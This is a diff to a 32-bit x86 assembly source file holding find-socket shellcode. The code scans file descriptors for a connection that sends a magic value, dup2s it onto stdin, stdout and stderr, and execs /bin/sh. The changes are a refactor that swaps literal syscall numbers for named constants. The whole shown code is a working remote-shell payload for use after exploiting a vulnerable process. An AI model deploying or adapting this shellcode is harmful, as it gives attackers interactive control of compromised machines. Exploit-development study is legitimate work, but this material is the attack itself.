@@ -2,7 +2,8 @@
 	;; Paolo Soto
 	;; Mon Mar  4 12:03:49 EST 2013
 	;; EBX, ECX, EDX, ??? then stack - but we only need 3		
-	;; read = 3, dup2 = 63, execve = 11 
+	;; read = 3, dup2 = 63, execve = 11
+	%include "../include/short32.s"
 
 	%define MAGIC dword 0xcafef00d
 BITS 32
@@ -24,10 +25,11 @@ ourread:
 	dec ebx 
 	jnz ourread.next
 	int 3			;debugging, do something else in prod
+	;; this breakpoint should trigger if we DON'T find the magic number
 .next:
 	; sets up read
 	xor eax,eax
-	mov al, 3 		;eax	
+	mov al, read 		;eax	
 	int 0x80		;read eax=3
 	cmp al,4  		;check to see if we've received our 4 bytes
 	jnz ourread  		;if not, try with another file descriptor
@@ -43,18 +45,20 @@ dup2:
 	mov cl, 2
 .copy:
 	xor eax,eax 	; because we need to nuke the retval of dup2
-	mov al,63	;dup2
+	mov al,dup2	;dup2
 	int 0x80
 	dec ecx    	; this is for looping stderr/out/in
 	jns dup2.copy
 
+	;; OUR SOCKET IS IN EBX
+	
 	;; now just some local shellcode
 	;; execve("/bin/sh", NULL, NULL) 
 	xor eax,eax 		; set up null byte
 	push eax  		; push null byte to terminate /bin/sh 
 	push 0x68732f2f         ; /bin//sh is too wide for register
 	push 0x6e69622f 	; use 2 pushes to the stack
-	mov al,11 		;execve in /usr/include/asm/unistd_32.h
+	mov al,execve 		;execve in /usr/include/asm/unistd_32.h
 	mov ebx,esp 		;arg1 = "/bin/sh\0" 
 	xor ecx,ecx 		;arg2 = \0
 	xor edx,edx 		;arg3 = \0
